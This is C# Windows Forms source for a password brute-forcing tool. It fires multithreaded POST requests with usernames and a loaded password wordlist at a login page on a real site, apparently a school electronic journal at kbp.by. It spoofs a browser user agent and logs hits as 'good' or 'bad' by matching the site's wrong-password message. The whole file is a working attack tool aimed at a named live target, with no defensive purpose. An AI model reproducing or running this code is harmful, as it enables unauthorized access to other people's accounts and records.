using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Web;
using System.IO;

namespace teachers2
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Names_CheckedChanged(object sender, EventArgs e)
        {
            //comboBox1.Enabled = Names.Checked;
        }
        Task[] tasks;
        private void button1_Click(object sender, EventArgs e)
        {
            if (withOutNames.Checked)
            {
                BadTB.Clear();
                //Thread stud = new Thread(Brute);
                //stud.IsBackground = true;
                //stud.Start();
                tasks = new Task[Convert.ToInt32(numericUpDown1.Value)];
                for (int i = 0; i < tasks.Length; i++)
                {
                    tasks[i] = Task.Factory.StartNew(Excuting);
                }
            }
        }

        public void Excuting()
        {
            Start.Invoke(new Action(() => Start.Enabled = false));
            numericUpDown1.Invoke(new Action(() => numericUpDown1.Enabled = false));
            for (int j = 0; j < comboBox1.Items.Count; j++)
            {
                for (int i = 0; i < PassList.Count; i++)
                {
                    var request = (HttpWebRequest)WebRequest.Create("http://kbp.by/ej2/t.php");
                    var postData = "login=" + HttpUtility.UrlEncode(comboBox1.Items[j].ToString()).ToUpper() + "&password=" + PassList[i];
                    var data = Encoding.ASCII.GetBytes(postData);
                    request.Method = "POST";
                    request.ContentLength = data.Length;
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36";


                    using (var stream = request.GetRequestStream())
                    {
                        stream.Write(data, 0, data.Length);
                    }

                    var response = (HttpWebResponse)request.GetResponse();

                    var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();

                    if (responseString.Contains("Введён неправильный пароль!"))
                    {
                        BadCounter.Text = (Convert.ToInt32(BadCounter.Text) + 1).ToString();
                        BadTB.Invoke(new Action(() => BadTB.Text += Environment.NewLine + "bad: "+ comboBox1.Items[j].ToString() + " : " + PassList[i]));
                    }
                    else
                    {
                        GoodCounter.Text = (Convert.ToInt32(GoodCounter.Text) + 1).ToString();
                        GoodsTB.Invoke(new Action(() => GoodsTB.Text += Environment.NewLine + "good: " + PassList[i]));
                    }
                }
            }
            MessageBox.Show("Not Found!");
            Start.Invoke(new Action(() => Start.Enabled = true));
        }

        List<string> PassList = new List<string>();
        private void LoadPass_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                PassList.AddRange(File.ReadAllLines(openFileDialog1.FileName, Encoding.Default));
                //Info.Text = string.Join(Environment.NewLine, PassList);                               
            }
        }

        private void Stop_Click(object sender, EventArgs e)
        {
            Task.WaitAll(tasks);
        }
    }
}
